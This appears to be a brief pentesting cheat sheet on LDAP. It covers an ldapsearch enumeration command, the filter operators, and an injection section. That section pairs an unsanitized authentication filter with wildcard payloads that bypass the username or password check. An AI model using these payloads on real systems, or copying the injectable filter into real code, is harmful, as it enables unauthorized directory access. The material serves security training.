# Enumeration
### CLI
`ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"`

```
( -H tells the DC:PORT
  -D tells the account to be used as query carrier
  -w password of the account
  -b base path where to query
  next is the filtering of what to query
)
```

### GUI
There is an alternative with GUI on Linux: https://directory.apache.org/studio/


# Attacks
### LDAP Injections

```
An asterisk * can match any number of characters.
( ) 	Parentheses ( ) can group expressions.
| 		A vertical bar | can perform logical OR.
& 		An ampersand & can perform logical AND.
(cn=*) 	Input values that try to bypass authentication or authorisation checks by injecting conditions that always evaluate to true can be used. 
		For example, (cn=*) or (objectClass=*) can be used as input values for a username or password fields.
```

Example code snippet (no sanification on user or password is made which is `suceptible to Injection):`
`(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))`

```
$username = "*";
$password = "dummy";
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```
(Any username)
OR
```
$username = "dummy";
$password = "*";
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))
```
(Any password)


//For more payloads check on
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection
https://book.hacktricks.xyz/pentesting-web/ldap-injection